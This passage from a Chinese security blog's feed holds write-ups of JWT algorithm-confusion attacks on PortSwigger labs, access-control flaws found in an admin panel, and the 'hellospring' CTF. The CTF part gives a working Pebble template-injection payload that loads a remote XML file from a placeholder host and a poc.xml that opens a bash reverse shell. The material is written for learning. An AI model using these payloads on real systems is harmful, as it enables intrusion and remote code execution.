<p>在Burpsuite的<code>JWT Editor</code> 中点击”New RSA Key”，用上边获取到泄露的JWK而生成一个新的RSA Key</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/23/6586a5561075f.png"  alt="image-20231223171605944"></p>
<p>选中”Copy Public Key as PEM”，同时将其进行base64编码操作，保存一下得到的字符串(备注:上下的一串—–END PUBLIC KEY—–不要删掉)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAj+eOXtjDkD6BYr0ftlLo</span><br><span class="line">rnU+xsXB2btxi4REHYghwP4YCiZjX7UsPvEYRWyt8FJzyQap+zUoueiFTWBt/Ngt</span><br><span class="line">qOCQWPUDMv9BQ3Kjpos6yC/PM8TEmJLsg0F2b1OcIoDuPgo9v0JWmSmpS+THqUwH</span><br><span class="line">xgizbwFBbZxS+aGPV9vv0KyULDV2CLjWjbyYh+2sJZFW7DFq1EHWedtqmTcY3/Gt</span><br><span class="line">Sv3CBNdv9Hn/J5d5P9gorrbuKrPnc2qD967poetwrmI/9TxQdCVSEjqLdBqEIzBg</span><br><span class="line">IbLRST2J0DNHX54ESyjcutmfRG833wEm1c8S98bhG3eGx+HpqX5/hkPPlwdZTPTy</span><br><span class="line">9QIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFqK2VPWHRqRGtENkJZcjBmdGxMbwpyblUreHNYQjJidHhpNFJFSFlnaHdQNFlDaVpqWDdVc1B2RVlSV3l0OEZKenlRYXArelVvdWVpRlRXQnQvTmd0CnFPQ1FXUFVETXY5QlEzS2pwb3M2eUMvUE04VEVtSkxzZzBGMmIxT2NJb0R1UGdvOXYwSldtU21wUytUSHFVd0gKeGdpemJ3RkJiWnhTK2FHUFY5dnYwS3lVTERWMkNMaldqYnlZaCsyc0paRlc3REZxMUVIV2VkdHFtVGNZMy9HdApTdjNDQk5kdjlIbi9KNWQ1UDlnb3JyYnVLclBuYzJxRDk2N3BvZXR3cm1JLzlUeFFkQ1ZTRWpxTGRCcUVJekJnCkliTFJTVDJKMEROSFg1NEVTeWpjdXRtZlJHODMzd0VtMWM4Uzk4YmhHM2VHeCtIcHFYNS9oa1BQbHdkWlRQVHkKOVFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==</span><br></pre></td></tr></table></figure>

<p>（3）生成一个对称加密的key，把k替换成我们刚修改完格式的公钥</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/23/6586a6b5ebe7e.png"  alt="image-20231223172157829"></p>
<p>（4）篡改jwt。</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/23/6586a74bad6c3.png"  alt="image-20231223172427569"></p>
<p>（5）使用这个公钥签名</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/23/6586a78323daa.png"  alt="image-20231223172523042"></p>
<p>（6）替换本地jwt –&gt; 删除<code>carlos</code>用户</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/23/6586a7ad7149a.png"  alt="image-20231223172605282"></p>
<h3 id="5、通过算法混淆（不暴露密钥）绕过-JWT-身份验证"><a href="#5、通过算法混淆（不暴露密钥）绕过-JWT-身份验证" class="headerlink" title="5、通过算法混淆（不暴露密钥）绕过 JWT 身份验证"></a>5、通过算法混淆（不暴露密钥）绕过 JWT 身份验证</h3><p>在公钥不可用的情况下您仍然可以通过使用jwt _ forgery.py之类的工具从一对现有的JWT中获取密钥来测试算法混淆，您可以在rsa_sign2n GitHub存储库中找到几个有用的脚本</p>
<p><a class="link"   href="https://github.com/silentsignal/rsa_sign2n" >https://github.com/silentsignal/rsa_sign2n<i class="fas fa-external-link-alt"></i></a></p>
<p>下边我们通过portswigger靶场来演示一下这个漏洞案例：</p>
<p>靶场地址：<a class="link"   href="https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key" >https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key<i class="fas fa-external-link-alt"></i></a></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/23/6586b6159471f.png"  alt="image-20231223182733413"></p>
<p>（1）打开靶场，首先我们先正常登录、退出，拿到两个jwt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJraWQiOiI2YTFkYjRlYS1hNGJmLTQ0NzQtYjQxMC0zYzk5NTc3YzJhMWMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTcwMzMyOTc4OX0.BCzT_VhEaeqfxPoRBYwduIju0AXpmPqJ8HzM-7iqYquyNx2NgPRiJNVvYemspXIPQ8_-sGr67Qn6lVSHgj51xoNd_jTJfYO8AlQWF4oAiz2Hfjfng6DN7VoiuJ7vQCMh9VSWnzLzG30leaEzyRjzHGnbFE9EUZ5Hbu7tXOFJU5IwHE35TuU5Xcnv2DXpRDxTsJpHvk5gKQWPx4XLNOY--8LJncBRUoDXD7jXCW0hdY19DPkIDI_xNKYi27sGkShv8_zf3G5oSVdChCVgSfdGyCivTtuQ3pAeTl1AwmJll9wy7v4MunWSMgXD_-SyiCakBNgPaMm_gWfTlATrrPPT_g</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJraWQiOiI2YTFkYjRlYS1hNGJmLTQ0NzQtYjQxMC0zYzk5NTc3YzJhMWMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTcwMzMyOTgxM30.IeXISe59u7Ju0k-NU2RUXORZlY4uKOOpDQC01TSVq35asYsRSUnh7yKS4bwooI6L5wSiZduaYbFNQeg2Na0RDvJx6-wIYR8LlEVQ9U2n7_8Z7pPkF9QVQDJGF6mUhQAEOS35gBFUOwvYsR2WaayKaOH_nSOJbFiQjOzF8EykR0LEz5vk2NhMYYMDbbO1LGJ5i2QBtIB5SfTwlZPiy7lK9d_Une2a0FwmeaoNA_4dIsiVo4hD3Av-DT_voCN9pSN-AuoofKqJYwolxHatfUGP4ONuVRwcVScJmvaH2UAh4YI1deRCk62nChBhmBt6TTclGn9xzJX7TeGfqsn6wmWQhA</span><br></pre></td></tr></table></figure>

<p>（2）随后将其放到靶场提供的docker工具里面运行，运行的命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run --rm -it portswigger/sig2n &lt;token1&gt; &lt;token2&gt;</span><br></pre></td></tr></table></figure>

<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/23/6586b3cdc628e.png"  alt="image-20231223181749611"></p>
<p>jwt _ forgery.py脚本会输出一系列token的存在情况值</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/23/6586b3dbf2eda.png"  alt="image-20231223181803810"></p>
<p>这里我们尝试每一个Tempered JWT，不过靶场这里给了提示说是X.509 形式的，所以我们只需要将X.509形式的JWT进行验证即可</p>
<p>（3）剩下的步骤结合上一关的一样了，创建恶意的jwt –&gt; 签名 –&gt; 替换本地jwt –&gt; 删除<code>carlos</code>用户</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/23/6586b4f581876.png"  alt="image-20231223182245303"></p>
<h2 id="0X08-一些其他的jwt安全问题"><a href="#0X08-一些其他的jwt安全问题" class="headerlink" title="0X08 一些其他的jwt安全问题"></a>0X08 一些其他的jwt安全问题</h2><p>就拿我之前碰到过的两个漏洞来说明！严格意义上不能说是jwt的问题，应该是程序设计的问题，但是跟jwt沾了一点边！</p>
<h3 id="1、未授权"><a href="#1、未授权" class="headerlink" title="1、未授权"></a>1、未授权</h3><p>访问管理后台，&#x2F;adplanet&#x2F;PlanetUser页面下有用户管理功能！</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/23/6586b8b7d3e2c.png"  alt="image-20231223183847582"></p>
<p>我们访问该页面并抓包，发现api:&#x2F;square&#x2F;GetAllSquareUser，用于获取用户信息，包括用户名、密码、邮箱地址等敏感信息！</p>
<p>我们把这个数据包放入文本模糊模块中，删除他的JWT token，然后发送数据包，我们可以发现我们仍然可以获取到用户信息！</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/06/65c23cce33a16.png"  alt="image-20240206220604327"></p>
<h3 id="2、垂直越权"><a href="#2、垂直越权" class="headerlink" title="2、垂直越权"></a>2、垂直越权</h3><p>和上边类似，只是另一个不同的功能带点。</p>
<p>还是抓包后删jwt，但是发现返回401</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/23/6586b93413b7e.png"  alt="image-20231223184051843"></p>
<p>此时，我们去前台注册一个普通用户获取他的jwt。携带这个jwt发包！</p>
<p>成功垂直越权！</p>
<h2 id="0X09-JWT漏洞的防护"><a href="#0X09-JWT漏洞的防护" class="headerlink" title="0X09 JWT漏洞的防护"></a>0X09 JWT漏洞的防护</h2><ul>
<li>使用最新的 JWT 库，虽然最新版本的稳定性有待商榷，但是安全性都是较高的。</li>
<li>对 jku 标头进行严格的白名单设置。</li>
<li>确保 kid 标头不容易受到通过 header 参数进行目录遍历或 SQL 注入的攻击。</li>
</ul>
<h2 id="0X0A-参考文章"><a href="#0X0A-参考文章" class="headerlink" title="0X0A 参考文章"></a>0X0A 参考文章</h2><p><a class="link"   href="https://paper.seebug.org/3057/#_1" >https://paper.seebug.org/3057/#_1<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.freebuf.com/articles/web/337347.html" >https://www.freebuf.com/articles/web/337347.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/pcheng/p/9629621.html" >https://www.cnblogs.com/pcheng/p/9629621.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/xiaozi/p/12005929.html" >https://www.cnblogs.com/xiaozi/p/12005929.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://portswigger.net/web-security/jwt/algorithm-confusion" >https://portswigger.net/web-security/jwt/algorithm-confusion<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="0X0B-原文地址"><a href="#0X0B-原文地址" class="headerlink" title="0X0B 原文地址"></a>0X0B 原文地址</h2><p>转载自公众号：安服仔Yu9<br>原文地址：<a class="link"   href="https://mp.weixin.qq.com/s/3rraOTO3Z-n9GzxFco5FOA" >https://mp.weixin.qq.com/s/3rraOTO3Z-n9GzxFco5FOA<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>jwt</tag>
      </tags>
  </entry>
  <entry>
    <title>强网hellospring引出SSTI的学习</title>
    <url>/blog/2024/01/02/240102%E5%BC%BA%E7%BD%91hellospring%E5%BC%95%E5%87%BASSTI%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a>0X00 前言</h2><p>太菜了，比赛时没做出来这道题。现在复现一下，顺便整理一下模版注入相关的知识，和各位师傅一块探讨一下！</p>
<blockquote>
<p>文中概念多来自互联网，如有侵权，联系删除！</p>
</blockquote>
<h2 id="0X01-什么是SSTI-模版注入"><a href="#0X01-什么是SSTI-模版注入" class="headerlink" title="0X01 什么是SSTI(模版注入)"></a>0X01 什么是SSTI(模版注入)</h2><h3 id="1、-模版引擎"><a href="#1、-模版引擎" class="headerlink" title="1、 模版引擎"></a>1、 模版引擎</h3><p>模板引擎（这里特指用于Web开发的模板引擎）：是为了使<code>用户界面</code>与<code>业务数据</code>（内容）分离而产生的，它可以生成特定格式的文档，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。</p>
<p>模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过。</p>
<h3 id="2、ssti（模版注入）"><a href="#2、ssti（模版注入）" class="headerlink" title="2、ssti（模版注入）"></a>2、ssti（模版注入）</h3><p>SSTI 就是服务器端模板注入（Server-Side Template Injection）。</p>
<p>当前使用的一些框架，比如python的flask，php的tp，java的spring等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。</p>
<p>漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p>
<p>凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。</p>
<p>更详细的内容可以看看这位师傅的文章：<a class="link"   href="https://www.cnblogs.com/bmjoker/p/13508538.html" >https://www.cnblogs.com/bmjoker/p/13508538.html<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="0X02-JSP是模版引擎吗？"><a href="#0X02-JSP是模版引擎吗？" class="headerlink" title="0X02 JSP是模版引擎吗？"></a>0X02 JSP是模版引擎吗？</h2><p><strong>JSP是web开发最早期的模板引擎产品。</strong></p>
<p>如果你在网上搜Spring Boot的教程，会发现模板引擎清一色用的<a class="link"   href="https://www.thymeleaf.org/" >Thymeleaf<i class="fas fa-external-link-alt"></i></a>，为什么很少人用JSP？因为Spring Boot官方已经不推荐使用JSP了。但Spring Boot提供了多种模板引擎的支持（<code>嵌入式容器JSP有限制，2010年后Velocity停止更新，所以JSP与Velocity两个不建议使用</code>）</p>
<p>springBoot支持的模板引擎有： Thymeleaf、FreeMarker、Velocity、Mustache、JSP、Groovy、Handlebars、Jade4j、Pebble、Thymol等等</p>
<p>因为这个文章主要来写<code>hellospring</code>这个题目，所以我们先学习<code>Pebble</code>模版！</p>
<h2 id="0X03-Pebble模版"><a href="#0X03-Pebble模版" class="headerlink" title="0X03 Pebble模版"></a>0X03 Pebble模版</h2><h3 id="1、简介"><a href="#1、简介" class="headerlink" title="1、简介"></a>1、简介</h3><p>Pebble是一款Java 模板引擎，开发他的灵感来自于Twig。它具有很强的模板延续性和易于阅读的语法；</p>
<h3 id="2、数据绑定示例"><a href="#2、数据绑定示例" class="headerlink" title="2、数据绑定示例"></a>2、数据绑定示例</h3><p>在模板中，开发人员可以动态值定义静态内容和占位符。在运行时，模板将由其引擎处理以映射模板中的动态值引用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">你好&#123;&#123;Name&#125;&#125;！</span><br></pre></td></tr></table></figure>

<p>在确定Name的值，经过引擎处理后的输出就是</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f1fdd7f96c.png"  alt="image-20231230033700540"></p>
<h3 id="3、漏洞原因"><a href="#3、漏洞原因" class="headerlink" title="3、漏洞原因"></a>3、漏洞原因</h3><p>在 Java 中各种表达式语言中利用模板注入的常用方法是使用类似于以下内容的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">variable.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;ls   -la&#x27;)</span><br></pre></td></tr></table></figure>

<p>基本上，Java中的每个对象都有一个称为 getClass()的方法，它可以通过检索特殊的 java.lang.class，轻而易举的获取任意 Java类的实例。因为它允许执行 OS 命令，下一步通常是获取 java.lang.Runtime 的实例。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123; variable.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;ls -la&#x27;) &#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="0X04-hellospring复现"><a href="#0X04-hellospring复现" class="headerlink" title="0X04 hellospring复现"></a>0X04 hellospring复现</h2><h3 id="1、环境搭建"><a href="#1、环境搭建" class="headerlink" title="1、环境搭建"></a>1、环境搭建</h3><p>比赛时给的附件公众号发送<code>hellospring</code>获取！</p>
<p>比赛给的是个jar包，直接解压在idea打开！</p>
<p>从<code>META-INF\MANIFEST.MF</code>路径下我们可以看到使用的jdk版本！</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f2256c2bf5.png"  alt="image-20231230034733717"></p>
<p>我们配置到对应的环境，直接在虚拟机把项目跑起来！</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f23bed32d9.png"  alt="image-20231230035333865"></p>
<p><strong>说明：</strong>给的附件和远程环境中的不一样！我们需要根据配置文件和源码return ‘home’写一个home.pebble放在&#x2F;tmp目录下,作为模板文件</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Home Page<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello!!!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f23fa78f14.png"  alt="image-20231230035433527"></p>
<p>成功访问到就说明环境搭建成功！</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f243593fbd.png"  alt="image-20231230035532629"></p>
<h3 id="2、题目环境分析"><a href="#2、题目环境分析" class="headerlink" title="2、题目环境分析"></a>2、题目环境分析</h3><p>给出了两个路由！</p>
<p>（1）根据参数x返回指定模板</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f25207d2da.png"  alt="image-20231230035927536"></p>
<p>（2）看名字应该是上传文件的</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f253d26775.png"  alt="image-20231230035956127"></p>
<p>写了个过滤器，但是没有内容！</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f2edfdf968.png"  alt="image-20231230044102897"></p>
<p>上传文件后，给文件重命名了</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f2f50dc494.png"  alt="image-20231230044255919"></p>
<p>使用的是<code>FileNameGenerator</code>这个工具类的<code>general_time</code>方法。大概就是获取当前日期，然后改改变格式。拼接生成新的文件名！</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f2fab46ca8.png"  alt="image-20231230044426254"></p>
<p>写个demo瞅瞅，最后就是<code>file_20231230_044928.pebble</code>这样的，很好构造！</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f30f2d9634.png"  alt="image-20231230044953867"></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f3100ce80d.png"  alt="image-20231230045007832"></p>
<h3 id="3、目录穿越"><a href="#3、目录穿越" class="headerlink" title="3、目录穿越"></a>3、目录穿越</h3><p>pebble当中有两个loader一个是classpathloader，另一个是fileloader，优先会在classpath下尝试加载模板文件，如果寻找不到则使用fileloader尝试加载模板文件</p>
<p>但是题目中给出了后缀名的限制，导致了不能任意文件读取。</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f258da4757.png"  alt="image-20231230040116689"></p>
<p>但是可以读取到.pebble的文件！我们写入一个类似文件测试一下！</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f267e15c69.png"  alt="image-20231230040517071"></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f265151aa1.png"  alt="image-20231230040432353"></p>
<h3 id="4、思路"><a href="#4、思路" class="headerlink" title="4、思路"></a>4、思路</h3><p>大胆的猜测一下出题人的思路！</p>
<ul>
<li>存在目录穿越(只能读取.pebble后缀文件)</li>
<li>有一个上传文件的路由</li>
</ul>
<p>大概思路就是通过上传点传一个.pebble的恶意文件，然后访问–&gt;触发pebble模版注入漏洞，然后rce或者反弹shell拿flag！</p>
<h3 id="5、本地复现"><a href="#5、本地复现" class="headerlink" title="5、本地复现"></a>5、本地复现</h3><p>（1）找到一个比较新的利用方式：<br><a class="link"   href="https://github.com/Y4tacker/Web-Security/issues/3" >https://github.com/Y4tacker/Web-Security/issues/3<i class="fas fa-external-link-alt"></i></a></p>
<p>大概思路：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、老版本的exploit，通过Class.forName加载任意类，新版本中修复了</span><br><span class="line"></span><br><span class="line">2、Spring应用程序的很多实例都是隐式注册为bean的，可以从持有lassloader对象的bean中找到一个对象，通过获取它我们可以通过执行loadClass来加载任何对象</span><br><span class="line"></span><br><span class="line">3、找到了org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory</span><br><span class="line"></span><br><span class="line">4、但是执行loadclass是不够的，还需要实例化该类</span><br><span class="line"></span><br><span class="line">5、spring的依赖中有jackson，通过jackson反序列化我们可以很方便的实例化一个类。</span><br><span class="line"></span><br><span class="line">6、bean 中有这个 jacksonObjectMapper 对象，现在可以实例化任意类，并且通过能够实例化任意类，绕过了过滤限制</span><br><span class="line"></span><br><span class="line">7、spring场景中我们很容易想到一个配置类org.springframework.context.support.ClassPathXmlApplicationContext，它允许我们加载远程xml配置文件，通过它我们可以轻松实现命令执行。</span><br><span class="line"></span><br><span class="line">8、但是此时你会发现任何继承自AbstractPointcutAdvisor和AbstractApplicationContext的类jackson都将不允许实例化</span><br><span class="line"></span><br><span class="line">9、不过jre中发现了一个名为java.beans.Beans的类。该类的instantiate方法可以帮助我们实例化任意方法。这样我们就得到了禁止通过间接方式实例化的ClassPathXmlApplicationContext类。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>poc.xml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">    &lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">       xsi:schemaLocation=&quot;</span><br><span class="line">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;</span><br><span class="line">        &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;</span><br><span class="line">            &lt;constructor-arg &gt;</span><br><span class="line">            &lt;list&gt;</span><br><span class="line">                &lt;value&gt;bash&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;-c&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;echo YmF...MQ==|base64 -d|bash -i&lt;/value&gt;</span><br><span class="line">            &lt;/list&gt;</span><br><span class="line">            &lt;/constructor-arg&gt;</span><br><span class="line">        &lt;/bean&gt;</span><br><span class="line">    &lt;/beans&gt;</span><br></pre></td></tr></table></figure>

<p>（2）python开个web服务，放poc.xml</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f2d9437a72.png"  alt="image-20231230043531255"></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f2dccdb70f.png"  alt="image-20231230043627888"></p>
<p>（3）vps开启端口监听</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f54bcbe54b.png"  alt="image-20231230072235388"></p>
<p>（4）接下里就是上传啦！！</p>
<p>poc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% set y= beans.get(&quot;org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory&quot;).resourceLoader.classLoader.loadClass(&quot;java.beans.Beans&quot;) %&#125;</span><br><span class="line">&#123;% set yy =  beans.get(&quot;jacksonObjectMapper&quot;).readValue(&quot;&#123;&#125;&quot;, y) %&#125;</span><br><span class="line">&#123;% set yyy = yy.instantiate(null,&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;) %&#125;</span><br><span class="line">&#123;&#123; yyy.setConfigLocation(&quot;http://xxxx/1.xml&quot;) &#125;&#125;</span><br><span class="line">&#123;&#123; yyy.refresh() &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>访问<code>/uploadFile</code>，yakit抓包，改成post请求，添加请求体</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f33c3055e0.png"  alt="image-20231230050153911"></p>
<p>结合之前分析的重命名规则，我们就可以构造出文件名，<code>但是注意是服务端的时间,我们的本地时间不一样</code></p>
<p>（5）结合之前分析的目录穿越访问！反弹shell。。</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f55b7f2da7.png"  alt="image-20231230072646532"></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f554e1869d.png"  alt="image-20231230072500677"></p>
<h2 id="0X05-总结"><a href="#0X05-总结" class="headerlink" title="0X05 总结"></a>0X05 总结</h2><p>其他的模版注入无非也就是：</p>
<p>服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的恶意的语句。</p>
<h2 id="0X06-参考文章"><a href="#0X06-参考文章" class="headerlink" title="0X06 参考文章"></a>0X06 参考文章</h2><p><a class="link"   href="https://www.cnblogs.com/bmjoker/p/13508538.html" >https://www.cnblogs.com/bmjoker/p/13508538.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://kumamon.fun/server-side-template-injection-on-the-example-of-pebble/" >https://kumamon.fun/server-side-template-injection-on-the-example-of-pebble/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://tttang.com/archive/1692/#toc" >https://tttang.com/archive/1692/#toc<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://blog.51cto.com/u_15585381/5277421" >https://blog.51cto.com/u_15585381/5277421<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://blog.tawnx.com/2022/07/25/SSTI/index.html" >https://blog.tawnx.com/2022/07/25/SSTI/index.html<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="0X07-原文地址"><a href="#0X07-原文地址" class="headerlink" title="0X07 原文地址"></a>0X07 原文地址</h2><p>转载自公众号：安服仔Yu9<br>原文地址：<a class="link"   href="https://mp.weixin.qq.com/s/PNOpAnkyhWoXHXFFfE4_Sw" >https://mp.weixin.qq.com/s/PNOpAnkyhWoXHXFFfE4_Sw<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>模版注入</tag>
      </tags>
  </entry>
  <entry>
    <title>数据完整性与数据身份验证</title>
    <url>/blog/2024/01/06/240106%E6%95%B0%E6%8D%AE%E5%AE%8C%E6%95%B4%E6%80%A7%E4%B8%8E%E6%95%B0%E6%8D%AE%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/</url>
    <content><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a>0X00 前言</h2><p>最近到朋友那里薅了一本<strong>python全栈安全</strong>，但是当我打开书仔细翻阅了之后才发现这本python全栈安全和<strong>python安全</strong>没有一丢丢关系。于是抱着多学一点不吃亏的心态还是看了起来。</p>
<p>那这本python全栈安全和<strong>python安全</strong>没有一丢丢关系。那它都讲了什么啊？揭秘：我个人觉得讲的偏向于数据安全，与python相关的就是使用python的函数、库进行运算。</p>
